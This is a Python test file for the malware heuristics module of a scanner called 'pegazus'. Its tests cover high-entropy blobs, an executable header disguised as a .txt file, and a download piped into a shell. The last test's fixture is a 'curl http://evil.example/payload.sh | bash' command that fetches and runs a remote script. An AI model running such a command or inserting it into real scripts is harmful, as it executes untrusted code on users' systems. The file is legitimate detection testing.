from __future__ import annotations

import os
from pathlib import Path

from pegazus.modules.malware.heuristics import scan_heuristics


def test_high_entropy_blob_is_flagged() -> None:
    random_bytes = os.urandom(4096)

    findings = scan_heuristics(random_bytes, Path("blob.bin"))

    assert any("entropia" in f.description.lower() for f in findings)


def test_low_entropy_text_is_not_flagged() -> None:
    text = b"a" * 4096

    findings = scan_heuristics(text, Path("plain.txt"))

    assert findings == []


def test_pe_header_with_text_extension_is_flagged() -> None:
    data = b"MZ" + b"\x00" * 300

    findings = scan_heuristics(data, Path("report.txt"))

    assert any("ejecutable" in f.title.lower() for f in findings)


def test_curl_pipe_bash_is_flagged() -> None:
    data = b"curl http://evil.example/payload.sh | bash\n"

    findings = scan_heuristics(data, Path("install.sh"))

    assert any("descarga" in f.title.lower() for f in findings)
